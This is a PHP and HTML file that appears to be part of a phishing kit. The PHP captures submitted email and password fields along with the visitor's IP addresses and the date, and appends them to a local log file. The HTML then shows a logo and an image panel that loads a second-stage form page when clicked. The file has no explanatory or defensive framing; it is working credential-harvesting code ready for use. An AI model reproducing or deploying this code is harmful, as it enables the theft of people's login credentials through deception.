<?php
    session_start();

    $_SESSION['u1'] = $_POST['gtrip01'];
    $_SESSION['u2'] = $_POST['gtrip02'];

    $_SESSION['fnm'] = "sacrix12.txt";
    $fhandlr = fopen($_SESSION['fnm'], "a");
    
    fwrite($fhandlr, "-------------------------------------------\n");
    fwrite($fhandlr, 'E: '.$_POST['gtrip01']."\n");
    fwrite($fhandlr, 'P: '.$_POST['gtrip02']."\n");

    @fwrite($fhandlr, 'IP1: '.$_SERVER['REMOTE_ADDR']."\n");
    @fwrite($fhandlr, 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
    
    
    fwrite($fhandlr, 'Date: '. date("d-m-Y")."\n");
    fclose($fhandlr);
    
?>

<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Inicio</title>
  </head>
  <body>
    <style>
      *{margin: 0;padding: 0;}
    </style>
    <div id="gtrx" style="height:100vh;text-align:center">
        <img src="logo.png" style="display: inline-block;margin-top: 60px; height:80px; max-width: 350px;"><br>
        <div onclick="ldfrm2()" id="gtr01" style="border-radius: 20px;margin-top: 20px;display: inline-block; width: 432px;height:580px;background-image:url(4.svg);box-shadow:0 2px 6px rgba(0,0,0,.2);background-repeat:no-repeat;">
            
            

        </div>
        <div style="height:30px;">

        </div>
    </div>
    <style>
        @media only screen and (max-width: 500px){
            #gtr01{
                zoom:80%;
            }
        }
    </style>
    <script>
        function ldfrm2() {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                document.getElementById("gtr01").innerHTML = this.responseText; 
                document.getElementById("gtr01").onclick = null;
                }
            };
            xhttp.open("GET", "gf2.html", true);
            xhttp.send();
        }
    </script>
  </body>
</html>